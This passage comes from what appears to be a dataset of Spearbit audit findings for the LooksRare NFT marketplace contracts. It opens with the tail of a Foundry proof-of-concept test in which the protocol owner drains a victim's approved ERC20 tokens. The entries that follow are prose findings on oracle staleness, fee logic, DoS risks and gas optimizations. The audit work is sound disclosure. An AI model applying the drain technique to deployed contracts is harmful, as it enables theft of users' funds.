address private victimUser = address(505); function setUp() public override { super.setUp(); vm.startPrank(_owner); looksRareProtocol.initiateOwnershipTransfer(signingOwner); // This particular strategy is not a requirement of the exploit. nullStrategy = new NullStrategy(); looksRareProtocol.addStrategy( 0, 0, 0, NullStrategy.executeNull.selector, false, address(nullStrategy) ); mockERC20 = new MockERC20(); looksRareProtocol.updateCurrencyWhitelistStatus(address(mockERC20), true); looksRareProtocol.updateCreatorFeeManager(address(0)); mockERC20.mint(victimUser, 1000); vm.stopPrank(); vm.prank(signingOwner); looksRareProtocol.confirmOwnershipTransfer(); } function testDrain() public { vm.prank(victimUser); mockERC20.approve(address(looksRareProtocol), 1000); vm.startPrank(signingOwner); looksRareProtocol.addTransferManagerForAssetType( 2, address(mockERC20), mockERC20.transferFrom.selector ); OrderStructs.MakerAsk memory makerAsk = _createSingleItemMakerAskOrder({ // null strategy askNonce: 0, subsetNonce: 0, strategyId: 1, assetType: 2, // ERC20 asset! orderNonce: 0, collection: victimUser, // <--- will be used as the `from` currency: address(0), signer: signingOwner, minPrice: 0, itemId: 1 }); 6 bytes memory signature = _signMakerAsk(makerAsk, signingOwnerPK); OrderStructs.TakerBid memory takerBid = OrderStructs.TakerBid( address(1000), // `amount` field for the `transferFrom` 0, makerAsk.itemIds, makerAsk.amounts, bytes(\"\") ); looksRareProtocol.executeTakerBid( takerBid, makerAsk, signature, _EMPTY_MERKLE_TREE, _EMPTY_AFFILIATE ); vm.stopPrank(); assertEq(mockERC20.balanceOf(signingOwner), 1000); assertEq(mockERC20.balanceOf(victimUser), 0); } }",
        "labels": [
            "Spearbit",
            "LooksRare",
            "Severity: Critical Risk"
        ]
    },
    {
        "title": "StrategyFloorFromChainlink will often revert due to stale prices",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf",
        "body": "The FloorFromChainlink strategy inherits from BaseStrategyChainlinkPriceLatency, so it can have a maxLatency of at most 3600 seconds. However, all of the chainlink mainnet floor price feeds have a heartbeat of 86400 seconds (24 hours), so the chainlink strategies will revert with the PriceNotRecentEnough error quite often. At the time of writing, every single mainnet floor price feed has an updateAt timestamp well over 3600 seconds in the past, meaning the strategy would always revert for any mainnet price feed right now. This may have not been realized earlier because the Goerli floor price feeds do have a heartbeat of 3600, but the mainnet heartbeat is much less frequent. One of the consequences is that users might miss out on exchanges they would have accepted. For example, if a taker bid is interested in a maker ask with an eth premium from the floor, in the likely scenario where the taker didn't log-in within 1 hour of the last oracle update, the strategy will revert and the exchange won't happen even though both parties are willing. If the floor moves up again the taker might not be interested anymore. The maker will have lost out on making a premium from the floor, and the taker would have lost out on the exchange they were willing to make.",
        "labels": [
            "Spearbit",
            "LooksRare",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "minPrice and maxPrice should reflect the allowed regions for the funds to be transferred from the bidder to the ask recipient",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf",
        "body": "1. When a maker or taker sets a minPrice for an ask, the protocol should guarantee the funds they receive is at minimum the minPrice amount (currently not enforced). 2. Also reversely, when a maker or taker sets a maxPrice for a bid, the protocol should guarantee that the amount they spend is at maximum maxPrice (currently enforced). For 1. the current protocol-controlled deviation can be 30% maximum (sum of fees sent to the creator, the protocol fee recipient, and an affiliate).",
        "labels": [
            "Spearbit",
            "LooksRare",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "StrategyItemIdsRange does not invalidate makerBid.amounts[0] == 0",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf",
        "body": "StrategyItemIdsRange does not check whether makerBid.amounts[0] is zero or not. If it was 0, the taker can provide empty itemIds and amounts which will cause the for loop to be skipped. The check below will also be successful since both amounts are 0: if (totalOfferedAmount != desiredAmount) { revert OrderInvalid(); } Depending on the used implementation of a transfer manager for the asset type used in this order, we might end up with the taker taking funds from the maker without providing any NFT tokens. The current implementation of TransferManager does check whether the provided itemIds have length 0 and it would revert in that case. One difference between this strategy and others are that all strategies including this one do check to revert if an amount for a specific itemId is 0 (and some of them have loops but the length of those loops depends on the parameters from the maker which enforce the loop to run at least once), but for this strategy if no itemIds are provided by the taker, the loop is skipped and one does not check whether the aggregated amount is 0 or not.",
        "labels": [
            "Spearbit",
            "LooksRare",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "TransferManager's owner can block token transfers for LooksRareProtocol",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf",
        "body": "In general, a deployed TransferManager ( T ) and a deployed LooksRareProtocol ( L ) might have two different owners ( OT , OL ). Assume TransferManager is used for asset types 0 and 1 (ERC721, ERC1155) in LooksRareProtocol and Trans- ferManager has marked the LooksRareProtocol as an allowed operator. At any point, OT can call removeOpera- tor to block L from calling T . If that happens, OL would need to add new (virtual) asset types (not 0 or 1) and the corresponding transfer managers for them. Makers would need to resign their orders with new asset types. Moreover, if LooksRare for the following issue \"The Protocol owner can drain users' currency tokens\" applies their solution through PR 308 which removes the ability of OL to add new asset types, then the whole protocol would need to be redeployed, since all order executions would revert.",
        "labels": [
            "Spearbit",
            "LooksRare",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "transferItemsERC721 and transferBatchItemsAcrossCollections in TransferManager do not check whether an amount == 1 for an ERC721 token",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf",
        "body": "transferItemsERC721 and transferBatchItemsAcrossCollections in TransferManager do not check whether an amount == 1 for an ERC721 token. If an operator (approved by a user) sends a 0 amount for an itemId in the context of transferring ERC721 token, TransferManager would perform those transfers, even though the logic in the operator might have meant to avoid those transfers.",
        "labels": [
            "Spearbit",
            "LooksRare",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "The maker cannot enforce the number of times a specific order can be fulfilled for custom strategies",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf",
        "body": "When a maker signs an order with a specific strategy it leaves it up to the strategy to decide how many times this specific order can be fulfilled. The strategy's logic on how to decide on the returned isNonceIn- validated value, can be a complex logic in general that might be prone to errors (or have backdoors). The maker should be able to directly enforce at least an upper bound for the maximum number of fulfills for an order to avoid unexpected expenditure.",
        "labels": [
            "Spearbit",
            "LooksRare",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "A strategy can potentially reduce the value of a token before it gets transferred to a maker when a taker calls executeTakerAsk",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf",
        "body": "When executeTakerAsk is called by a taker a (signed by maker) strategy will be called: (bool status, bytes memory data) = strategyInfo[makerBid.strategyId].implementation.call( abi.encodeWithSelector(strategyInfo[makerBid.strategyId].selector, takerAsk, makerBid) ); Note that this is a stateful call. This call is performed before the NFT token is transferred to the maker (signer). Even though the strategy is fixed by the maker (since the stratgeyId has been signed), the strategy's implementation might involve a complex logic that might allow (if the strategy colludes with the taker somehow) a derivative token (that is owned by / linked to the to-be-transferred token) to be reattached to another token (think of accessories for an NFT character token in a game). And so the value of the to-be-transferred token would be reduced in that sense. A maker would not be able to check for this linked derivative token ownership during the transaction since there is no post-transfer hook for the maker (except in one special case when the token involved is ERC1155 and the maker is a custom contract). Also, note that all the implemented strategies would not alter the state when they are called (their endpoints have a pure or a view visibility). There is an exception to this in the StrategyTestMultiFillCollectionOrder test contract.",
        "labels": [
            "Spearbit",
            "LooksRare",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "An added transfer manager cannot get deactivated from the protocol",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf",
        "body": "Once a transfer manager for an asset type gets added to the protocol either through the constructor or through addTransferManagerForAssetType, if at some point there is a malicious behavior involved with the transfer manager, there is no mechanism for the protocol's owner to deactivate the transfer manager (similar to how strategies can be deactivated). If TransferManager is used for an asset type, on the TransferManager side the owner can break the link between the operator (the LooksRare protocol potentially) and the TransferManager but not the other way around.",
        "labels": [
            "Spearbit",
            "LooksRare",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Temporary DoS is possible in case orders are using tokens with blacklists",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf",
        "body": "In the process of settling orders, _transferFungibleTokens is being called at max 4 times. In case one of these calls fails the entire transaction fails. It can only fail when an ERC20 token is used for the trade but since contracts are whitelisted in the system and probably vetted by the team, it's safe to say it's less probable that the receiver will have the ability to revert the entire transaction, although it is possible for contracts that implement a transferAndCall pattern. However, there's still the issue of transactions being reverted due to blacklistings (which have become more popular in the last year). In order to better assess the risk let's elaborate more on the 4 potential recipients of a transaction: 1. affiliate - The risk can be easily mitigated by proper handling at the front-end level. If the transaction fails due to the affiliate's address, the taker can specify address(0) as the affiliate. 2. recipient - If the transaction fails due to the recipient's address, it can only impact the taker in a gas-griefing way. 3. protocol - If the transaction fails due to the protocol's address, its address might be updated by the contract owner in the worst case. 4. creator - If the transaction fails due to the creator's address it can not be changed directly, but in the worst case creatorFeeManager can be changed.",
        "labels": [
            "Spearbit",
            "LooksRare",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "viewCreatorFeeInfo's reversion depends on order of successful calls to collection.royaltyInfo",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf",
        "body": "The outcome of the call to viewCreatorFeeInfo for both CreatorFeeManagerWithRebates and Cre- atorFeeManagerWithRoyalties is dependent on the order of itemIds. Assume, we have 2 itemIds with the following properties:  itemId x where the call to collection.royaltyInfo(x, price) is successful (status == 1) and returns (a, ...) where a 6= 0.  itemId y where the call to collection.royaltyInfo(y, price) fails (status == 0) Then if itemIds provided to viewCreatorFeeInfo is:  [x, y], the call to viewCreatorFeeInfo returns successfully as the outcome for y will be ignored/skipped.  [y, x], the call to viewCreatorFeeInfo reverts with BundleEIP2981NotAllowed(collection), since the first item will be skipped and so the initial value for creator will not be set and remains address(0), but when we process the loop for x, we end up comparing a with address(0) which causes the revert.",
        "labels": [
            "Spearbit",
            "LooksRare",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "CreatorFeeManagerWithRebates.viewCreatorFeeInfo reversion is dependent on the order of itemIds",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf",
        "body": "Assume there is an itemId x where collection.royaltyInfo(x, price) returns (0, _) and an- other itemId y where collection.royaltyInfo(y, price) returns (a, _) where a 6= 0. the itemIds array provided to CreatorFeeManagerWithRebates.viewCreatorFeeInfo is [x, y, the call would revert with the return parameters would be (address(0), 0) and [y, x, ...], Then if ...], BundleEIP2981NotAllowed(collection).",
        "labels": [
            "Spearbit",
            "LooksRare",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Seller might get a lower fee than expected due to front-running",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf",
        "body": "This protocol seems to have a fee structure where both the protocol and the original creator of the item are charging fees, and these fees are being subtracted from the seller's fee. This means that the seller, whether they are a maker or a taker, may receive a lower price than they expected due to sudden changes in creator or protocol fee rates.",
        "labels": [
            "Spearbit",
            "LooksRare",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "StrategyManager does not emit an event when the first strategy gets added.",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf",
        "body": "StrategyManager does not emit an event when the first strategy gets added which can cause issues for off-chain agents.",
        "labels": [
            "Spearbit",
            "LooksRare",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "TransferSelectorNFT does not emit events when new transfer managers are added in its construc- tor",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf",
        "body": "TransferSelectorNFT does not emit an event when assetTypes of 0 and 1 are added in its con- structor.",
        "labels": [
            "Spearbit",
            "LooksRare",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Protocol fees will be sent to address(0) if protocolFeeRecipient is not set.",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf",
        "body": "Protocol fees will be sent to address(0) if protocolFeeRecipient is not set.",
        "labels": [
            "Spearbit",
            "LooksRare",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "The returned price by strategies are not validated",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf",
        "body": "When a taker submits an order to be executed, the returned price by the maker's chosen strategy is not validated. The current strategies do have the validations implemented. But the general upper and lower bound price validation would need to be in the protocol contract itself since the price calculation in a potential strategy might be a complex matter that cannot be easily verified by a maker or a taker. Related issue: \"price validation in executeStrategyWithTakerAsk, executeCollectionStrategyWithTakerAsk and ex- ecuteCollectionStrategyWithTakerAskWithProof can be relaxed\"",
        "labels": [
            "Spearbit",
            "LooksRare",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Makers can sign (or be tricked into signing) collection of orders (using the merkle tree mechanism) that cannot be entirely canceled.",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf",
        "body": "All user-facing order execution endpoints of the protocol check whether the order hash is included in the merkle tree data provided by the caller. If it is, the maker/signer is only required to sign the hash of the tree's root. A maker might sign (or get tricked into signing) a root that belongs to trees with a high number of leaves such that the leaves each encode an order with  Different subsetNonce and orderNonce (this would require canceling each nonce individually if the relevant endpoints are used).  askNonce or bidNonce that form a consecutive array of intergers ( 1, (cid:1) (cid:1) (cid:1) , n ) (this would require incrementing these nonces at least n times, if this method was used as a way of canceling the orders). To cancel these orders, the maker would need to call the cancelOrderNonces, cancelSubsetNonces, or incre- mentBidAskNonces. If the tree has a high number of nodes, it might be infeasible to cancel all the orders due to gas costs. The maker would be forced to remove its token approvals (if it's not a custom EIP-1271 maker/signer) and not use that address again to interact with the protocol.",
        "labels": [
            "Spearbit",
            "LooksRare",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "The ItemIdsRange strategy allows for length mismatch in itemIds and amounts",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf",
        "body": "There is no validation that takerAsk.itemIds.length == takerAsk.amounts.length in the ItemIdsRange strategy, despite takerAsk.itemIds and takerAsk.amounts being the return values of the executeStrategyWithTakerAsk function. If takerAsk.itemIds.length > takerAsk.amounts.length, then the transaction will revert anyways when it attempts to read an index out of bounds in the main loop. However, there is nothing causing a revert if takerAsk.itemIds.length < takerAsk.amounts.length, and any extra values in the takerAsk.amounts array will be ignored. Most likely this issue would be caught later on in any transaction, e.g. the current TransferManager implementation checks for length mismatches. However, this TransferManager is just one possible implementation that could be added to the TransferSelectorNFT contract, so this still could be an issue.",
        "labels": [
            "Spearbit",
            "LooksRare",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Spec mismatch - StrategyCollectionOffer allows the only single item orders where the spec states it should allow any amount",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf",
        "body": "Proof only allow the transfer of a single ERC721/ERC1155 item, although the specification states it should support any amount.",
        "labels": [
            "Spearbit",
            "LooksRare",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Owner of strategies that inherit from BaseStrategyChainlinkMultiplePriceFeeds can add mali- cious price feeds after they have been added to LooksRareProtocol",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf",
        "body": "Owner of strategies that inherit from BaseStrategyChainlinkMultiplePriceFeeds can add mali- cious price feeds for new collections after they have been added to LooksRareProtocol. It's also important to note that these strategy owners might not neccessarily be the same owner as the LooksRareProtocol's. 1. LooksRareProtocol's OL adds strategy S. 2. Stragey's owner OS adds a malicous price feed for a new collection T .",
        "labels": [
            "Spearbit",
            "LooksRare",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "The price calculation in StrategyDutchAuction can be more accurate",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf",
        "body": "StrategyDutchAuction calculates the auction price as uint256 duration = makerAsk.endTime - makerAsk.startTime; uint256 decayPerSecond = (startPrice - makerAsk.minPrice) / duration; uint256 elapsedTime = block.timestamp - makerAsk.startTime; price = startPrice - elapsedTime * decayPerSecond; One of the shortcomings of the above calculation is that division comes before multiplication which can amplify the error due to division.",
        "labels": [
            "Spearbit",
            "LooksRare",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Incorrect isMakerBidValid logic in ItemIdsRange execution strategy",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf",
        "body": "If an ItemIdsRange order has makerBid.itemIds[0] == 0, it is treated as invalid by the corre- sponding isMakerBidValid function. Since makerBid.itemIds[0] is the minItemId value, and since many NFT collections contain NFTs with id 0, this is incorrect (and does not match the logic of the ItemIdsRange executeS- trategyWithTakerAsk function). As a consequence, frontends that filter orders based on the isMakerBidValid function will ignore certain orders, even though they are valid.",
        "labels": [
            "Spearbit",
            "LooksRare",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Restructure struct definitions in OrderStructs in a more optimized format",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf",
        "body": "Maker and taker ask and bid structs include the fields itemIds and amounts. For most strategies, these two arrays are supposed to have the same length (except for StrategyItemIdsRange). Even for Strate- gyItemIdsRange one can either:  Relax the requirement that makerBid.amounts.length == 1 (be replaced by amounts and itemIds length to be equal to 2 ) by allowing an unused extra amount or  not use the makerBid.amounts and makerBid.itemIds and instead grab those 3 parameters from the addi- tionalParameters field. This might actually make more sense since in the case of StrategyItemIdsRange, the itemIds and amounts carry information that deviates from what they are intended to be used for.",
        "labels": [
            "Spearbit",
            "LooksRare",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "if/else block in executeMultipleTakerBids can be simplified/optimized",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf",
        "body": "if/else block in executeMultipleTakerBids can be simplified/optimized by using the continue keyword and placing the else's body in the outer scope. // If atomic, it uses the executeTakerBid function, if not atomic, it uses a catch/revert pattern with external function ,! if (isAtomic) { // Execute the transaction and add protocol fee totalProtocolFeeAmount += _executeTakerBid(takerBid, makerAsk, msg.sender, orderHash); unchecked { ++i; } continue; } try this.restrictedExecuteTakerBid(takerBid, makerAsk, msg.sender, orderHash) returns ( uint256 protocolFeeAmount ) { totalProtocolFeeAmount += protocolFeeAmount; } catch {} unchecked { ++i; } testThreeTakerBidsERC721OneFails() (gas: -24 (-0.002%)) Overall gas change: -24 (-0.002%) LooksRare: Fixed in PR 323. Spearbit: Verified.",
        "labels": [
            "Spearbit",
            "LooksRare",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Cache currency in executeTakerAsk and executeTakerBid",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf",
        "body": "currency is read multiple times from calldata in executeTakerAsk and executeTakerBid.",
        "labels": [
            "Spearbit",
            "LooksRare",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Cache operators[i] in grantApprovals and revokeApprovals",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf",
        "body": "operators[i] is used 3 times in grantApprovals's (and twice in revokeApprovals) for loop.",
        "labels": [
            "Spearbit",
            "LooksRare",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "recipients[0] is never used",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf",
        "body": "recipients[0] is set to protocolFeeRecipient. But its value is never used afterward. payProtocolFeeAndAffiliateFee, the fees[0] amount is manually distributed to an affiliate if any and the pro- tocolFeeRecipient.",
        "labels": [
            "Spearbit",
            "LooksRare",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "currency validation can be optimized/refactored",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf",
        "body": "In the context above we are enforcing only native tokens or WETH to be supplied. The if statement can be simplified and refactored into a utility function (possibly defined in either BaseStrategy or in BaseStrate- gyChainlinkPriceLatency): if (makerAsk.currency != address(0)) { if (makerAsk.currency != WETH) { revert WrongCurrency(); } }",
        "labels": [
            "Spearbit",
            "LooksRare",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "validating amount can be simplified and possibly refactored",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf",
        "body": "In the context above, we are trying to invalidate orders that have 0 amounts or an amount other than 1 when the asset if an ERC721 if (amount != 1) { if (amount == 0) { revert OrderInvalid(); } if (assetType == 0) { revert OrderInvalid(); } } The above snippet can be simplified into: if (amount == 0 or (amount != 1 and assetType == 0)) { revert OrderInvalid(); }",
        "labels": [
            "Spearbit",
            "LooksRare",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "_verifyMatchingItemIdsAndAmountsAndPrice can be further optimized",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf",
        "body": "_verifyMatchingItemIdsAndAmountsAndPrice's validation logic uses more opcodes than is neces- sary. Also, the whole function can be turned into an assembly block to further optimized this function. Examples of simplifications for if conditions or(X, gt(Y, 0)) or(X, Y) // simplified version or(X, iszero(eq(Y,Z))) or(X, xor(Y, Z)) // simplified version The nested if block below if (amount != 1) { if (amount == 0) { revert OrderInvalid(); } if (assetType == 0) { revert OrderInvalid(); } } can be simplified into 33 if (amount == 0) { revert OrderInvalid(); } if ((amount != 1) && (assetType == 0)) { revert OrderInvalid(); }",
        "labels": [
            "Spearbit",
            "LooksRare",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "In StrategyFloorFromChainlink premium amounts miss the related checks when compared to checks for discount amounts",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf",
        "body": "For discount amounts, StrategyFloorFromChainlink has custom checks for the underflows (even though they will be caught by the compiler): 36 if (floorPrice <= discountAmount) { revert DiscountGreaterThanFloorPrice(); } uint256 desiredPrice = floorPrice - discountAmount; ... // @dev Discount cannot be 100% if (discount >= 10_000) { revert OrderInvalid(); } uint256 desiredPrice = (floorPrice * (10_000 - discount)) / 10_000; Similar checks for overflows for the premium are missing in the execution and validation endpoints (even though they will be caught by the compiler, floorPrice + premium or 10_000 + premium might overflow).",
        "labels": [
            "Spearbit",
            "LooksRare",
            "Severity: Informational"
        ]
    },
    {
        "title": "StrategyFloorFromChainlink's isMakerBidValid compare the time dependent floorPrice to a fixed discount",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf",
        "body": "When isMakerBidValid gets called depending on the market conditions at that specific time the comparisons between the floorPrice and the discount might cause this function to either return isValid as true or false.",
        "labels": [
            "Spearbit",
            "LooksRare",
            "Severity: Informational"
        ]
    },
    {
        "title": "StrategyFloorFromChainlink's isMakerAskValid does not validate makerAsk.additionalParameters",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf",
        "body": "For executeFixedPremiumStrategyWithTakerBid and executeBasisPointsPremiumStrategy- WithTakerBid, maker needs to make sure to populate its additionalParameters with the premium amount, otherwise the taker's transactions would revert: makerAsk.additionalParameters = abi.encode(premium); isMakerAskValid does not check whether makerAsk.additionalParameters has 32 as its length. For example, the validation endpoint for StrategyCollectionOffer does check this for the merkle root.",
        "labels": [
            "Spearbit",
            "LooksRare",
            "Severity: Informational"
        ]
    },
    {
        "title": "StrategyFloorFromChainlink strategies do not check for asset types explicitly",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf",
        "body": "StrategyFloorFromChainlink has 4 different execution endpoints:  executeFixedPremiumStrategyWithTakerBid  executeBasisPointsPremiumStrategyWithTakerBid  executeFixedDiscountCollectionOfferStrategyWithTakerAsk  executeBasisPointsDiscountCollectionOfferStrategyWithTakerAsk All these endpoints require that only one amount to be passed (asked for or bid on) and that amount would need to be 1. This is in contrast to StrategyCollectionOffer strategy that allows an arbitrary amount (although also required to be only one amount, [a]) Currently, Chainlink only provides price feeds for a selected list of ERC721 collections: https://docs.chain.link/ data-feeds/nft-floor-price/addresses So, if there are no price feeds for ERC1155 (as of now), the transaction would revert. Thus implicitly one can deduce that the chainlink floor strategies are only implemented for ERC721 tokens. Other strategies condition the amounts based on the assetType: 38  assetType == 0 or ERC721 collections can only have 1 as a valid amount  assetType == 0 or ERC1155 collections can only have a non-zero number as a valid amount If in the future chainlink or another token-price-feed adds support for some ERC1155 collections, one cannot use the current floor strategies to fulfill an order with an amount greater than 1.",
        "labels": [
            "Spearbit",
            "LooksRare",
            "Severity: Informational"
        ]
    },
    {
        "title": "itemIds and amounts are redundant fields for takerXxx struct",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf",
        "body": "Taker is the entity that initiates the calls to LooksRareProtocol's 3 order execution endpoints. Most implemented strategies (which are fixed/chosen by the maker through signing the makerXxx which includes the strategyId) require the itemIds and amounts fields for the maker and the taker to mirror each other. i : the j th element of maker's itemIds fields (the struct would be either MakerBid or MakerAsk depending  M j on the context)  M j a : the j th element of maker's amounts fields (the struct would be either MakerBid or MakerAsk depending on the context)  T j i : the j th element of taker's itemIds fields (the struct would be either TakerBid or TakerAsk depending on the context)  T j a : the j th element of taker's amounts fields (the struct would be either TakerBid or TakerAsk depending on the context) Borrowing notations also from:  \"Constraints among the number of item ids and amounts for taker or maker bids or asks are inconsistent among different strategies\"  IneheritedStategy : T j i = M j  StrategyDutchAuction : T j i , T j i = M j a = M j a i , T j a = M j a , taker can send extra itemIds and amounts but they won't be  StrategyUSDDynamicAsk : T j i = M j i , T j a = M j a , taker can send extra itemIds and amounts but they won't be used. used.  StrategyFloorFromChainlink.execute...PremiumStrategyWithTakerBid : T 0 i = M 0 i , T 0 a = M 0 a = 1 , taker can send extra itemIds and amounts but they won't be used.  StrategyFloorFromChainlink.execute...DiscountCollectionOfferStrategyWithTakerAsk : T 0 a = M 0 a = 1 , maker's itemIds are unused.  StrategyCollectionOffer : T 0 a = M 0 a , maker's itemIds are unused and taker's T i a for i > 0 are also unused.  StrategyItemIdsRange : M 0 i (cid:20) T j i (cid:20) M 1 i , P T j a = M 0 a . 39 For  IneheritedStategy  StrategyDutchAuction  StrategyUSDDynamicAsk  StrategyFloorFromChainlink.execute...PremiumStrategyWithTakerBid Shared taker's itemIds and amounts are redundant as they should exactly match maker's fields. For the other strategies, one can encode the required parameters in either maker's or taker's additionalParameters fields.",
        "labels": [
            "Spearbit",
            "LooksRare",
            "Severity: Informational"
        ]
    },
    {
        "title": "discount == 10_000 is not allowed in executeBasisPointsDiscountCollectionOfferStrategyWith- TakerAsk",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf",
        "body": "executeBasisPointsDiscountCollectionOfferStrategyWithTakerAsk reverts if discount == 10_000, but does not if discount == 99_99 which almost has the same effect. Note that if discount == 10_000, (forgetting about the revert) price = desiredPrice = 0. So, unless the taker (sender of the transaction) has set its takerAsk.minPrice to 0 (maker is bidding for a 100% discount and taker is gifting the NFT), the transaction would revert: if (takerAsk.minPrice > price) { // takerAsk.minPrice > 0 revert AskTooHigh(); }",
        "labels": [
            "Spearbit",
            "LooksRare",
            "Severity: Informational"
        ]
    },
    {
        "title": "Restructure executeMultipleTakerBids's input parameters",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf",
        "body": "executeMultipleTakerBids has the following form function executeMultipleTakerBids( OrderStructs.TakerBid[] calldata takerBids, OrderStructs.MakerAsk[] calldata makerAsks, bytes[] calldata makerSignatures, OrderStructs.MerkleTree[] calldata merkleTrees, address affiliate, bool isAtomic ) For the input parameters provided, we need to make sure takerBids, makerAsks, makerSignatures, and merkle- Trees all have the same length. We can enforce this requirement by definition, if we restructure the input passed to executeMultipleTakerBids.",
        "labels": [
            "Spearbit",
            "LooksRare",
            "Severity: Informational"
        ]
    },
    {
        "title": "Restructure transferBatchItemsAcrossCollections input parameter format",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf",
        "body": "transferBatchItemsAcrossCollections has the following form function transferBatchItemsAcrossCollections( address[] calldata collections, uint256[] calldata assetTypes, address from, address to, uint256[][] calldata itemIds, uint256[][] calldata amounts ) where collections, assetTypes, itemIds and amounts are supposed to have the same lengths. One can enforce that by redefining the input parameter and have this invariant enforced by definition.",
        "labels": [
            "Spearbit",
            "LooksRare",
            "Severity: Informational"
        ]
    },
    {
        "title": "An approved operator can call transferBatchItemsAcrossCollections",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf",
